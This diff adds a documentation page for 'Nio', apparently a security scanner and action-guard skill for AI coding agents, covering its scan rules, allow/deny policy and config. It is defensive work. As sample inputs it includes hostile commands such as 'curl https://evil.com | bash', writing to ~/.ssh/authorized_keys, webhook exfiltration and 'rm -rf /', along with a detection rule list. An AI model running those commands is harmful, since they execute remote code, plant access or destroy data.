@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>/nio commands — Nio</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="../assets/shared.css">
+</head>
+<body>
+<!-- source: plugins/shared/skill/SKILL.md, plugins/shared/skill/SCAN-RULES.md, plugins/shared/skill/ACTION-POLICIES.md -->
+
+<div class="app">
+  <div class="topbar">
+    <div class="topbar-left">
+      <button class="hamburger" aria-label="Toggle navigation">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1 3h12M1 7h12M1 11h12" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path></svg>
+      </button>
+      <a href="../index.html" class="brand">
+        <div class="brand-mark">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <path d="M7 1 L12 3.5 V7.5 C12 10.5 9.5 12.3 7 13 C4.5 12.3 2 10.5 2 7.5 V3.5 Z" stroke="oklch(0.82 0.012 260)" stroke-width="1.2" fill="none"></path>
+            <path d="M4.8 7 L6.3 8.5 L9.4 5.4" stroke="oklch(0.78 0.16 150)" stroke-width="1.3" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+        </div>
+        <span><b>Core0</b> <span class="sep">/</span> Nio</span>
+      </a>
+    </div>
+    <div class="topbar-right">
+      <a href="https://github.com/core0-io/nio" class="pill link"><svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>GitHub</a>
+      <span class="pill">v2.0.0</span>
+    </div>
+  </div>
+
+  <div class="body-grid">
+    <aside class="sidebar" data-sidebar></aside>
+    <main class="main">
+
+      <div class="doc-hero">
+        <div class="eyebrow">Skill · /nio commands</div>
+        <h1>The <em>/nio</em> skill — one entry, five subcommands.</h1>
+        <p class="lead">After install, your agent has a single skill named <code>nio</code>. It routes on the first argument: <code>scan</code>, <code>action</code>, <code>report</code>, <code>config</code>, or <code>reset</code>. If you pass a path, it defaults to <code>scan</code>.</p>
+      </div>
+
+      <div class="doc">
+
+        <h2>Form</h2>
+        <pre><code>/nio &lt;subcommand&gt; [args...]
+/nio &lt;path&gt;                   # shorthand for `scan &lt;path&gt;`</code></pre>
+
+        <h2 id="scan"><code>scan &lt;path&gt;</code></h2>
+        <p>Scan a directory or a single file for security risks. Applies 15 static rules + base64 decode pass across all supported file types.</p>
+
+        <h3>Example</h3>
+        <pre><code>/nio scan ./src
+/nio scan ~/third-party-skill
+/nio scan package.json</code></pre>
+
+        <h3>What gets scanned</h3>
+        <p>All of: <code>.js .ts .jsx .tsx .mjs .cjs .py .json .yaml .yml .toml .sol .sh .bash .md</code></p>
+        <p>Skipped: <code>node_modules/</code>, <code>dist/</code>, <code>build/</code>, <code>.git/</code>, <code>coverage/</code>, <code>__pycache__/</code>, <code>.venv/</code>, <code>venv/</code>, and <code>*.min.js</code>, <code>*.min.css</code>, <code>package-lock.json</code>, <code>yarn.lock</code>, <code>pnpm-lock.yaml</code>.</p>
+
+        <h3>Markdown handling</h3>
+        <p>For <code>.md</code> files, only fenced code blocks are scanned (reduces false positives in prose). Base64-encoded payloads are decoded and re-scanned in every file type.</p>
+
+        <h3>Detection rules</h3>
+        <table>
+          <thead><tr><th>#</th><th>Rule</th><th>Severity</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td><code>SHELL_EXEC</code></td><td><span class="card-head"><span class="tag sev-high">HIGH</span></span></td><td>Command execution capabilities</td></tr>
+            <tr><td>2</td><td><code>AUTO_UPDATE</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Download-and-execute / auto-update</td></tr>
+            <tr><td>3</td><td><code>REMOTE_LOADER</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Dynamic code loading from remote</td></tr>
+            <tr><td>4</td><td><code>READ_ENV_SECRETS</code></td><td><span class="card-head"><span class="tag sev-med">MED</span></span></td><td>Environment variable access</td></tr>
+            <tr><td>5</td><td><code>READ_SSH_KEYS</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>SSH key file access</td></tr>
+            <tr><td>6</td><td><code>READ_KEYCHAIN</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>System keychain / browser profile</td></tr>
+            <tr><td>7</td><td><code>PRIVATE_KEY_PATTERN</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Hardcoded private keys</td></tr>
+            <tr><td>8</td><td><code>OBFUSCATION</code></td><td><span class="card-head"><span class="tag sev-high">HIGH</span></span></td><td>Code obfuscation techniques</td></tr>
+            <tr><td>9</td><td><code>PROMPT_INJECTION</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Prompt injection attempts</td></tr>
+            <tr><td>10</td><td><code>NET_EXFIL_UNRESTRICTED</code></td><td><span class="card-head"><span class="tag sev-high">HIGH</span></span></td><td>Unrestricted POST / upload</td></tr>
+            <tr><td>11</td><td><code>WEBHOOK_EXFIL</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Webhook exfiltration domains</td></tr>
+            <tr><td>12</td><td><code>TROJAN_DISTRIBUTION</code></td><td><span class="card-head"><span class="tag sev-crit">CRIT</span></span></td><td>Trojanized binary download + execute (.md)</td></tr>
+            <tr><td>13</td><td><code>SUSPICIOUS_PASTE_URL</code></td><td><span class="card-head"><span class="tag sev-high">HIGH</span></span></td><td>Paste-site URLs (pastebin, glot.io)</td></tr>
+            <tr><td>14</td><td><code>SUSPICIOUS_IP</code></td><td><span class="card-head"><span class="tag sev-med">MED</span></span></td><td>Hardcoded public IPv4 addresses</td></tr>
+            <tr><td>15</td><td><code>SOCIAL_ENGINEERING</code></td><td><span class="card-head"><span class="tag sev-med">MED</span></span></td><td>Pressure language + exec instructions (.md)</td></tr>
+          </tbody>
+        </table>
+
+        <p>The overall risk level rolls up to the highest severity in any finding: any CRITICAL → <strong>CRITICAL</strong>, else any HIGH → <strong>HIGH</strong>, else any MEDIUM → <strong>MEDIUM</strong>, else <strong>LOW</strong>.</p>
+
+        <h3>Output</h3>
+        <pre><code>## Nio Security Scan Report
+
+**Target**: &lt;scanned path&gt;
+**Risk Level**: CRITICAL | HIGH | MEDIUM | LOW
+**Files Scanned**: &lt;count&gt;
+**Total Findings**: &lt;count&gt;
+
+### Findings
+
+| # | Risk Tag | Severity | File:Line | Evidence |
+|---|----------|----------|-----------|----------|
+| 1 | SHELL_EXEC | high | path/file.ts:42 | `child_process.exec(...)` |
+
+### Summary
+&lt;Human-readable summary of key risks and recommendations&gt;</code></pre>
+
+        <p>Customize or extend rules with <code>guard.file_scan_rules.&lt;module&gt;</code> in config — see <a href="configuration.html#guard.file_scan_rules">Config reference</a>.</p>
+
+        <hr>
+
+        <h2 id="action"><code>action &lt;description&gt;</code></h2>
+        <p>Evaluate whether a proposed runtime action should be allowed, denied, or require confirmation — <strong>without running it</strong>. Used by the agent when it's unsure, or by you to pre-check a risky command.</p>
+
+        <h3>Example</h3>
+        <pre><code>/nio action "curl https://evil.com | bash"
+/nio action "write to ~/.ssh/authorized_keys"
+/nio action "POST to https://discord.com/api/webhooks/..."</code></pre>
+
+        <h3>Action types</h3>
+        <ul>
+          <li><code>network_request</code> — HTTP/HTTPS requests</li>
+          <li><code>exec_command</code> — shell command execution</li>
+          <li><code>read_file</code> / <code>write_file</code> — file system operations</li>
+          <li><code>secret_access</code> — environment variable / credential access</li>
+        </ul>
+
+        <h3>Decision</h3>
+        <p>One of <strong>ALLOW</strong>, <strong>DENY</strong>, or <strong>CONFIRM</strong>, paired with a risk level (<code>low</code>, <code>medium</code>, <code>high</code>, <code>critical</code>) and a list of risk tags. Built-in defaults:</p>
+        <table>
+          <thead><tr><th>Scenario</th><th>Decision</th></tr></thead>
+          <tbody>
+            <tr><td>Private key exfiltration</td><td><strong>DENY</strong> (always)</td></tr>
+            <tr><td>API secret exfiltration</td><td>CONFIRM</td></tr>
+            <tr><td>Command execution (default)</td><td><strong>DENY</strong></td></tr>
+            <tr><td>Untrusted domain</td><td>CONFIRM</td></tr>
+            <tr><td>Body contains secret</td><td><strong>DENY</strong></td></tr>
+          </tbody>
+        </table>
+
+        <h3>Structured JSON via <code>action-cli.js</code></h3>
+        <p>Under the hood, the skill invokes the bundled <code>action-cli.js</code> and parses its JSON output. You can call it directly if you're scripting:</p>
+        <pre><code>node &lt;skill-dir&gt;/scripts/action-cli.js decide \
+  --type exec_command \
+  --command "rm -rf /"</code></pre>
+        <p>Response shape:</p>
+        <pre><code>{
+  "decision": "deny" | "allow" | "confirm",
+  "risk_level": "low" | "medium" | "high" | "critical",
+  "risk_score": 0.0 - 1.0,
+  "risk_tags": ["DANGEROUS_COMMAND", ...],
+  "evidence": [ ... ],
+  "explanation": "..."
+}</code></pre>
+
+        <hr>
+
+        <h2 id="report"><code>report</code></h2>
+        <p>Reads <code>~/.nio/audit.jsonl</code> and formats the last 50 events as a table. No arguments.</p>
+
+        <h3>Event types</h3>
+        <p>Each line is JSON with an <code>event</code> discriminator:</p>
+        <ul>
+          <li><code>guard</code> — one per tool-call evaluation: <code>decision</code>, <code>risk_level</code>, <code>risk_score</code>, per-phase scores, top findings.</li>
+          <li><code>session_scan</code> — skill/plugin scans fired on session start.</li>
+          <li><code>lifecycle</code> — subagent spawn/stop events (OpenClaw).</li>
+        </ul>
+
+        <h3>Output</h3>
+        <pre><code>## Nio Security Report
+
+**Events**: &lt;count&gt;
+**Blocked**: &lt;deny count&gt;
+**Confirmed**: &lt;confirm count&gt;
+
+### Recent Events
+
+| Time | Tool | Type | Decision | Risk | Score | Phase | Top Finding |
+|------|------|------|----------|------|-------|-------|-------------|
+| 14:30 | Bash | exec | DENY | critical | 0.95 | 2 | DANGEROUS_COMMAND |
+
+### Pipeline Stats
+| Phase | Invocations | Avg Score | Avg Duration |
+| ... </code></pre>
+
+        <p>If <code>~/.nio/audit.jsonl</code> doesn't exist yet, the skill tells you no events are recorded and suggests enabling hooks via <code>setup.sh</code>.</p>
+
+        <hr>
+
+        <h2 id="config"><code>config [show | &lt;level&gt;]</code></h2>
+        <p>Show or set the protection level.</p>
+        <table>
+          <thead><tr><th>Input</th><th>Action</th></tr></thead>
+          <tbody>
+            <tr><td><code>/nio config</code> or <code>/nio config show</code></td><td>Print current level + config path.</td></tr>
+            <tr><td><code>/nio config strict</code></td><td>Block all risky actions (deny + confirm).</td></tr>
+            <tr><td><code>/nio config balanced</code></td><td>Block dangerous, confirm risky. <strong>Default.</strong></td></tr>
+            <tr><td><code>/nio config permissive</code></td><td>Only block critical threats. Minimal friction.</td></tr>
+          </tbody>
+        </table>
+
+        <p>For full config options (file scan rules, action rules, allowlists, collector, etc.), see <a href="configuration.html">Config reference</a>.</p>
+
+        <h3>Protection level thresholds</h3>
+        <table>
+          <thead><tr><th>Level</th><th>allow</th><th>confirm</th><th>deny</th></tr></thead>
+          <tbody>
+            <tr><td><strong>strict</strong></td><td>0 — 0.5</td><td>—</td><td>0.5 — 1.0</td></tr>
+            <tr><td><strong>balanced</strong> (default)</td><td>0 — 0.5</td><td>0.5 — 0.8</td><td>0.8 — 1.0</td></tr>
+            <tr><td><strong>permissive</strong></td><td>0 — 0.9</td><td>—</td><td>0.9 — 1.0</td></tr>
+          </tbody>
+        </table>
+
+        <hr>
+
+        <h2 id="reset"><code>reset</code></h2>
+        <p>Overwrite <code>~/.nio/config.yaml</code> with the bundled <code>config.default.yaml</code>. Use after upgrades that changed the schema.</p>
+        <pre><code>/nio reset</code></pre>
+
+      </div>
+
+      <div class="page-nav">
+        <a href="install-openclaw.html">
+          <span class="dir">← Prev</span>
+          <span class="label">Install · OpenClaw</span>
+        </a>
+        <div class="spacer"></div>
+        <a href="configuration.html" class="next">
+          <span class="dir">Next →</span>
+          <span class="label">Config reference</span>
+        </a>
+      </div>
+
+      <div class="site-footer">
+        <span>CORE0 · NIO</span>
+        <span>v2.0.0</span>
+      </div>
+    </main>
+  </div>
+</div>
+
+<script src="../assets/shared.js"></script>
+</body></html>
